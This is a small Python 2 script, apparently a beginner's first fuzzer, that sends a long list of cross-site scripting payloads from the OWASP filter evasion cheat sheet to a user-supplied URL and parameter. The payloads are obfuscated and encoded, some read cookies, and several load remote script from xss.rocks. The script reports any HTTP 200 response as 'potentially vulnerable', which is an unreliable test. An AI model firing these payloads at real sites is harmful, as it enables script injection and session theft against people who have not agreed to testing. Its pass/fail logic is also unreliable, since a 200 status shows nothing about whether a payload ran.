import requests
import time

#my first fuzzer
#filter evasion cheat sheet from OWASP: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
picks = [
'\'\';!--"<XSS>=&{()}',
'<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>',
'<script>alert(document.cookie)</script>">',
'<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">',
'<img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">',
'<IMG SRC="javascript:alert(\'XSS\');">',
'<IMG SRC=javascript:alert(\'XSS\')>',
'<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
'<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
'<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
'<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
'<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
'<IMG SRC=# onmouseover="alert(\'xxs\')">',
'<IMG SRC= onmouseover="alert(\'xxs\')">',
'<IMG onmouseover="alert(\'xxs\')">',
'<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
'<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
'<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
'<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
'<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
'<IMG SRC="jav	ascript:alert(\'XSS\');">',
'<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
'<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
'<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
'perl -e \'print "<IMG SRC=java\0script:alert(\"XSS\")>";\' > out',
'<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
'<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
'<<SCRIPT>alert("XSS");//<</SCRIPT>',
'<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
'<SCRIPT SRC=//xss.rocks/.j>',
'<IMG SRC="javascript:alert(\'XSS\')"',
'<iframe src=http://xss.rocks/scriptlet.html <',
'\";alert(\'XSS\');//',
'</script><script>alert(\'XSS\');</script>',
'</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
'<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
'<BODY BACKGROUND="javascript:alert(\'XSS\')">',
'<IMG DYNSRC="javascript:alert(\'XSS\')">',
'<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
'<IMG LOWSRC="javascript:alert(\'XSS\')">',
'<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
'<IMG SRC=\'vbscript:msgbox("XSS")\'>',
'<IMG SRC="livescript:[code]">',
'<svg/onload=alert(\'XSS\')>',
'Set.constructor`alert\x28document.domain\x29```',
'<BODY ONLOAD=alert(\'XSS\')>',
'<BGSOUND SRC="javascript:alert(\'XSS\');">',
'<BR SIZE="&{alert(\'XSS\')}">',
'<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
'<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">',
'<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>',
'<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">',
'<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>',
'<STYLE>@im\port\'\javascript:alert("XSS")\';</STYLE>',
'<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
'<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>',
'<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>',
'<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
'<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE> ',
'<XSS STYLE="xss:expression(alert(\'XSS\'))">',
'<XSS STYLE="behavior: url(xss.htc);">',
'<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
'<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
'<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
'<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
'<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
'<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
'<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
'<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
'<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
'<DIV STYLE="background-image:075\0072\006C\0028\'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029\'\0029">',
'<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">',
'<DIV STYLE="width: expression(alert(\'XSS\'));">',
'<BASE HREF="javascript:alert(\'XSS\');//">',
' <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>'

]
urlvar = raw_input("url: ")
invar = raw_input("search variable: ")
for x in picks:
    payload = {invar:x}
    r = requests.get(urlvar, params=payload)
    print 'injecting ' + x + '...'
    if r.status_code == 200:
        print 'potentially vulnerable'
    else:
        print 'not vulnerable'

    time.sleep(1)
